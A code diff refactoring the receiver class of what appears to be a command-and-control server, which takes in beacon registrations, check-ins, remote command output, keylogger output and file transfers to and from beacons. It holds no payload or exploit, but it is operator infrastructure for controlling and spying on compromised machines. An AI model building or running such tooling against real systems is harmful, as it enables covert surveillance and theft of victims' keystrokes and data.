@@ -371,51 +371,66 @@ class BaseReceiver(QObject):
                 utils.logger.log_message(f"Error in file receive: {e}")
             return False
     
-    def handle_command_processing(self, sock: socket.socket, initial_data: str, client_address: tuple):
-        """Handle command processing with encoding - common implementation"""
+    def process_received_data(self, raw_data: bytes, client_info: Dict[str, Any]) -> tuple[bytes, bool]:
+        """
+        Process received data in a transport-agnostic way
+        
+        Args:
+            raw_data: Raw bytes received from client
+            client_info: Client information dict (address, transport type, etc.)
+            
+        Returns:
+            Tuple of (response_bytes, keep_connection_alive)
+        """
         try:
-            keep_alive = self._process_command(sock, initial_data)
-            if not keep_alive:
-                return
-                
-            while True:
-                try:
-                    data_raw = self._receive_data(sock, getattr(self, 'buffer_size', 1048576))
-                    if not data_raw:
-                        break
-                        
-                    data_decoded = self.encoding_strategy.decode(data_raw)
-                    data = data_decoded.decode('utf-8').strip()
-                    self.update_bytes_received(len(data_raw))
-                    
-                    keep_alive = self._process_command(sock, data)
-                    if not keep_alive:
-                        break
-                        
-                except socket.timeout:
-                    continue
-                except Exception as e:
-                    if utils.logger:
-                        utils.logger.log_message(f"Error processing command from {client_address}: {e}")
-                    break
-                    
+            # Decode the data
+            try:
+                decoded_data = self.encoding_strategy.decode(raw_data)
+                data_str = decoded_data.decode('utf-8').strip()
+            except Exception as e:
+                if utils.logger:
+                    utils.logger.log_message(f"Decoding error from {client_info}: {e}")
+                error_response = self.encoding_strategy.encode(b"ERROR|Decoding failed")
+                return error_response, False
+            
+            # Update stats
+            self.update_bytes_received(len(raw_data))
+            
+            # Parse command and handle
+            parts = data_str.split('|')
+            if not parts:
+                error_response = self.encoding_strategy.encode(b"ERROR|Invalid command format")
+                return error_response, False
+            
+            command = parts[0]
+            
+            # Handle file transfer commands
+            if command in ("to_beacon", "from_beacon"):
+                # File transfers require special handling by each transport
+                # Return indication that this needs transport-specific processing
+                return b"FILE_TRANSFER_REQUIRED", True
+            
+            # Process regular commands
+            response_str = self._process_command_data(data_str, client_info)
+            response_bytes = self.encoding_strategy.encode(response_str.encode('utf-8'))
+            
+            # Determine if connection should stay alive
+            single_transaction_commands = {
+                "register", "request_action", "checkin", "command_output", "keylogger_output"
+            }
+            keep_alive = command not in single_transaction_commands
+            
+            return response_bytes, keep_alive
+            
         except Exception as e:
             if utils.logger:
-                utils.logger.log_message(f"Error in command handler for {client_address}: {e}")
+                utils.logger.log_message(f"Error processing data from {client_info}: {e}")
+            error_response = self.encoding_strategy.encode(b"ERROR|Processing failed")
+            return error_response, False
     
-    def _process_command(self, sock: socket.socket, data: str) -> bool:
-        """Process individual commands with encoding - common implementation"""
-        single_transaction_commands = {
-            "register", "request_action", "checkin", "command_output", "keylogger_output"
-        }
-        
-        parts = data.split('|')
-        if not parts:
-            error_response = self.encoding_strategy.encode(b"Invalid command format")
-            self._send_data(sock, error_response)
-            self.update_bytes_sent(len(error_response))
-            return False
-            
+    def _process_command_data(self, data_str: str, client_info: Dict[str, Any]) -> str:
+        """Process command data and return response string"""
+        parts = data_str.split('|')
         command = parts[0]
         
         try:
@@ -423,11 +438,13 @@ class BaseReceiver(QObject):
             if command == "command_output" and len(parts) >= 2:
                 beacon_id = parts[1]
                 output = '|'.join(parts[2:]) if len(parts) > 2 else ""
-                response = self.command_processor.process_command_output(beacon_id, output)
+                return self.command_processor.process_command_output(beacon_id, output)
+                
             elif command == "keylogger_output" and len(parts) >= 2:
                 beacon_id = parts[1]
-                output = data.split('|', 2)[2] if len(parts) > 2 else ""
-                response = self.command_processor.process_keylogger_output(beacon_id, output)
+                output = data_str.split('|', 2)[2] if len(parts) > 2 else ""
+                return self.command_processor.process_keylogger_output(beacon_id, output)
+                
             else:
                 # Standard command dispatch
                 response = {
@@ -451,14 +468,63 @@ class BaseReceiver(QObject):
                         if len(parts) == 2 else "Invalid checkin format",
                 }.get(command, lambda: "Unknown command")()
                 
-            # Encode and send response
-            encoded_response = self.encoding_strategy.encode(response.encode('utf-8'))
-            self._send_data(sock, encoded_response)
-            self.update_bytes_sent(len(encoded_response))
-            
-            return command not in single_transaction_commands
-            
+                return response
+                
         except Exception as e:
             if utils.logger:
                 utils.logger.log_message(f"Error processing command {command}: {e}")
-            return False
+            return f"ERROR|Command processing failed: {e}"
+
+    def handle_command_processing(self, sock: socket.socket, initial_data: str, client_address: tuple):
+        """Handle command processing with encoding - legacy method for TCP connections"""
+        try:
+            # Use new unified processing for initial data
+            client_info = {"address": client_address, "transport": "tcp"}
+            response_bytes, keep_alive = self.process_received_data(initial_data.encode('utf-8'), client_info)
+            
+            # Handle special cases
+            if response_bytes == b"FILE_TRANSFER_REQUIRED":
+                # Let the TCP receiver handle file transfer
+                parts = initial_data.split('|')
+                self.handle_file_transfer(sock, parts[0], parts, client_address)
+                return
+            
+            # Send response
+            self._send_data(sock, response_bytes)
+            self.update_bytes_sent(len(response_bytes))
+            
+            if not keep_alive:
+                return
+                
+            # Continue processing additional messages for persistent connections
+            while True:
+                try:
+                    data_raw = self._receive_data(sock, getattr(self, 'buffer_size', 1048576))
+                    if not data_raw:
+                        break
+                        
+                    response_bytes, keep_alive = self.process_received_data(data_raw, client_info)
+                    
+                    if response_bytes == b"FILE_TRANSFER_REQUIRED":
+                        data_str = self.encoding_strategy.decode(data_raw).decode('utf-8')
+                        parts = data_str.split('|')
+                        self.handle_file_transfer(sock, parts[0], parts, client_address)
+                        continue
+                    
+                    self._send_data(sock, response_bytes)
+                    self.update_bytes_sent(len(response_bytes))
+                    
+                    if not keep_alive:
+                        break
+                        
+                except socket.timeout:
+                    continue
+                except Exception as e:
+                    if utils.logger:
+                        utils.logger.log_message(f"Error processing command from {client_address}: {e}")
+                    break
+                    
+        except Exception as e:
+            if utils.logger:
+                utils.logger.log_message(f"Error in command handler for {client_address}: {e}")
+    
